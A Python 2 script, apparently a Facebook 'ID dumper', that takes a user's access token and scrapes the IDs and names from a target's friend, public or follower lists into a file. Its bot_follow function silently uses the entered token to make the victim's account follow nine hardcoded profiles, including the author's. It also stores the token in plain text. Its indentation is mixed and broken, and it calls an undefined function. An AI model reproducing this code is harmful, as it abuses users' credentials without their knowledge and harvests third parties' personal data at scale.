#!/usr/bin/python2
#-*-coding:utf-8-*-

import requests,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def banner():
    print("""
   ___                
  / _ \__ ____ _  ___ ® ┌──────────────────────────────┐
 / // / // /  ' \/ _ \  │  Script By Dapunta Khurayra  │
/____/\_,_/_/_/_/ .__/  │   •• Github.com/Dapunta ••   │
   ID Facebook /_/      └──────────────────────────────┘""")
  
def login():
    os.system('clear')
    banner()
    toket = raw_input("\n[•] Token : ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print('\n[•] Login Successful')
        bot_follow()
    except KeyError:
        print ("\n[!] Token Invalid")
        os.system('clear')
        login()

def bot_follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token invalid")
		logs()
    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
    	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel
    	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
    	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
    	requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
        requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + toket) #Muh Rizal Fiansyah
        requests.post('https://graph.facebook.com/100010484328037/subscribers?access_token=' + toket) #Rizal F
        requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket) #Angga Kurniawan
    	menu()

def menu():
        os.system("clear")
        banner()
	try:
	    	toket = open('login.txt','r').read()
	    	otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
	    	a = json.loads(otw.text)
	    	nama = a['name']
	    	id = a['id']
	except Exception as e:
	    	print ("\n[•] Error : %s"%e)
	    	login()
    print("\n[1] Dump ID From Friend")
    print("[2] Dump ID From Public")
    print("[3] Dump ID From Followers")
    print("[0] Log Out")
    r=raw_input("\n[•] Choose : ")
    if r=="":
	    print("\n[!] Fill In The Correct")
	    menu()
    elif r=="1":
	    friend()
    elif r=="2":
	    public()
    elif r=="3":
	    followers()
    elif r=="0":
	try:
		os.system('rm -rf login.txt')
		exit()
	except Exception as e:
		print("\n[!] Error File Not Found %s"%e)
    else:
	    print ("\n[!] Wrong Input")
	    menu()	

def friend():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token Invalid")
		os.system('rm -rf login.txt')
		login()
	try:
		idt = raw_input("\n[•] ID Target        : ")
                limit = raw_input("[•] Limit (Max 1000) : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name Account     : "+op["name"])
		except KeyError:
			print("\n[!] ID NOT found")
			print("\n[ Back ]")
			friend()
		r=requests.get("https://graph.facebook.com/me/friends?limit="+limit+"&access_token="+toket)
		id = []
		z=json.loads(r.text)
		jalan("\n[•] Getting ID ...\n")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r%s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.005)
			print(a['id']+" • "+a['name']+'\n')
		ys.close()
		print ('\n[•] Sukses Dump ID From %s'%op['name'])
		print ("[•] Total ID : %s"%(len(id)))
		print ("[•] Output   : %s"%qq)
		raw_input("\n[ Back ]")
		menu()
		
	except Exception as e:
		exit("[•] Error : %s"%e)

def public():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token Invalid")
		os.system('rm -rf login.txt')
		login()
	try:
		idt = raw_input("\n[•] ID Target        : ")
                limit = raw_input("[•] Limit (Max 1000) : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name Account     : "+op["name"])
		except KeyError:
			print("\n[!] ID NOT found")
			print("\n[ Back ]")
			public()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limit+"&access_token="+toket)
		id = []
		z=json.loads(r.text)
		jalan("\n[•] Getting ID ...\n")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r%s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.005)
			print(a['id']+" • "+a['name']+'\n')
		ys.close()
		print ('\n[•] Sukses Dump ID From %s'%op['name'])
		print ("[•] Total ID : %s"%(len(id)))
		print ("[•] Output   : %s"%qq)
		raw_input("\n[ Back ]")
		menu()
		
	except Exception as e:
		exit("[•] Error : %s"%e)

def followers():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token Invalid")
		os.system('rm -rf login.txt')
		login()
	try:
		idt = raw_input("\n[•] ID Target        : ")
                limit = raw_input("[•] Limit (Max 1000) : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name Account     : "+op["name"])
		except KeyError:
			print("\n[!] ID NOT found")
			print("\n[ Back ]")
			followers()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+toket)
		id = []
		z=json.loads(r.text)
		jalan("\n[•] Getting ID ...\n")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r%s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.005)
			print(a['id']+" • "+a['name']+'\n')
		ys.close()
		print ('\n[•] Sukses Dump ID From %s'%op['name'])
		print ("[•] Total ID : %s"%(len(id)))
		print ("[•] Output   : %s"%qq)
		raw_input("\n[ Back ]")
		menu()
		
	except Exception as e:
		exit("[•] Error : %s"%e)

if __name__=='__main__':
	menu()